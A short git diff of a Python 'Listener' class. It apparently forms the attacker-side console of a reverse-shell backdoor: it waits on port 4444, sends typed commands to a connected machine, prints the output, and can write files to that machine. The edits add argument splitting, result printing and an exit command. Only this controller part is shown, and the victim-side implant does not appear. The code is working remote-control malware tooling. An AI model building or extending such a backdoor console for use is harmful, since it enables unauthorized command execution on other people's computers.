@@ -2,7 +2,7 @@
 import socket
 import json
 import base64
-import communicate as comms
+import json_communicate as comms
 
 
 class Listener:
@@ -17,6 +17,11 @@ class Listener:
 
     def execute_remotely(self, command):
         comms.send(self.connection, command)
+
+        if command[0] == "exit":
+            self.connection.close()
+            exit()
+
         return comms.receive(self.connection)
 
     def write_file(self, path, content):
@@ -27,8 +32,9 @@ class Listener:
     def run(self):
         while True:
             command = input(">> ")
-            #command = command.split(' ')
+            command = command.split(" ")
             result = self.execute_remotely(command)
+            print (result)
             
 
 my_listener = Listener("localhost", 4444)
